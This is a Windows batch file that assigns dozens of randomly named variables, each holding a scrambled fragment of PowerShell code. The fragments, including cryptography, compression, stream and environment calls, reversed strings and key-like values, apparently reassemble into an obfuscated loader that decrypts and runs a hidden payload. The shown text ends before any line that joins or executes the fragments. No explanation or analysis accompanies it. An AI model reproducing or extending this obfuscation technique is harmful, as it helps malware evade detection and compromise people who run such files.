@echo off
set "zjvsJkPFmW=ode]"
set "geHWmJCrRL=vert"
set "jnJsbTVHzn=.Com"
set "QcctsYwRbN=mory"
set "AGHbssVUzW=and "
set "iTAGwREGTH=sGUc"
set "jmjGWnpaJU=ose("
set "JtXFqxfjXB=.Cry"
set "JSIkwMgVLU=saBm"
set "gllmJKOWPe=).Sp"
set "juUmPengYs=$yka"
set "WeIQWCxGwL=+hAO"
set "TrNnYHLvve=-joi"
set "JkLbCEcRDz=('l0"
set "pXAqNOXkjs=comm"
set "qdUgLaKdSB=gp.D"
set "aVWkbrbYIA=.Mod"
set "JrkxbBWDwU=m.IO"
set "hLkkFnOhmf=[Env"
set "HEtImrYBgV=.Cop"
set "WXclrGGSjN=aVN."
set "nGLugZfmrM=[IO."
set "RsBrlRHEnb=$MGH"
set "WetqcBmyDN=tsWi"
set "tCvfMMUmGT== [S"
set "EsVkeQgXIt=1..-"
set "xvNuYwfQxy=tem."
set "xbNvEnbadh=Secu"
set "suEOaMOHwS=$HaK"
set "urGMNguGpJ=urit"
set "YEGxRMVzZR=-1.."
set "DzYoIebwIT= [Sy"
set "MFaAwsuXlM=nirt"
set "bODkXwwNoQ=; };"
set "YaCZtRzHsq=ay()"
set "VhRUVtNEDv=am;$"
set "gSbfTAbjMa=yste"
set "WGKJUdNiPK=ewLi"
set "wIVpkEbPSj=;$cS"
set "vNFsBvDhTx=ew-O"
set "JXLPfbIcqO=.Dis"
set "UcovgpOfCe= = $"
set "HQYqMnEwyg=();$"
set "vdPvxEhZiC=$dGa"
set "IyibIQReky=Secu"
set "PpamiiTGvJ=stem"
set "OCAOkvjrlG=0O+g"
set "msRlOIClxp=V = "
set "tOfgbAscBJ=Comp"
set "ztAutUCpik=trea"
set "eUKQxCilbX=tryP"
set "FcimeQIGdf=m.IO"
set "hAroigPAhI==');"
set "PCZMTDkjHn=ispo"
set "jBoIHubveW=axo "
set "NWrRpDrAzO=]::("
set "PUPMbjnYEf=em.C"
set "sSBcmWpvoR=Esen"
set "lMNkLBsAXT=ct S"
set "fjdWxWJGrz= if "
set "joKMvUXQdK=.-16"
set "ZrmBZNzcLK=3); "
set "sCkMNWpouR=ddin"
set "cVYHpZVBNQ=Dn);"
set "jlnuiJzxnx=($Bh"
set "koIrBVktGc=6esa"
set "gqPehteAbR=rity"
set "YXOSaFRyTl=se()"
set "nnaTvHjZdx=k; }"
set "xidBbXVgSq=in $"
set "jGTSitRDNi=hy.A"
set "IPJOzDQsUe=:('g"
set "ljOTNbkkga=Esen"
set "DziBugCVII=SaVN"
set "SqStiWgHEK=m.Re"
set "jZEckadZUK=Star"
set "qrdHXJxlKo=form"
set "aZMQxfuwQp=n ''"
set "WBjosUWQcv=3HWs"
set "YbTVvIzzWO=slg "
set "gKtTPQPpCI=esaB"
